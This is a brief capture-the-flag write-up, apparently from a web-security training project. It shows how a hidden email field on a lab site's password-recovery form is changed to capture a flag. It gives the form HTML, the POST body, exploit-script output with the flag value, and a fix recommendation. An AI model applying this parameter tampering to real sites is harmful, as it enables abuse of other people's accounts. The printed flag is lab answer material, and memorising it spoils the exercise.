# Hidden field on pass recover page

## Exploitation

On the login page (http://192.168.1.48/?page=signin), there a link `forgot my password`. When click on it, we get the `recover` page (http://192.168.1.48/?page=recover)

On this page, there is a form button to resend the password

When inspect the page, we can see the form structure

```html
<form action="#" method="POST">
	<input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
	<input type="submit" name="Submit" value= "Submit">
</form>
```

There is a hidden field `mail` with an email on it, let's change it with my email address

We got the flag!

Script it to send manually the post request with the email, without change the code in the browser

The POST request is :

```
mail=webmaster%40borntosec.com&Submit=Submit
```

```
$ ./exploit.py 
 The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0
```

## How to fix it?

Never use hidden fields to store informations. Prefer to do this in the backend code

The hidden fields are not display on the page but is on the source code...


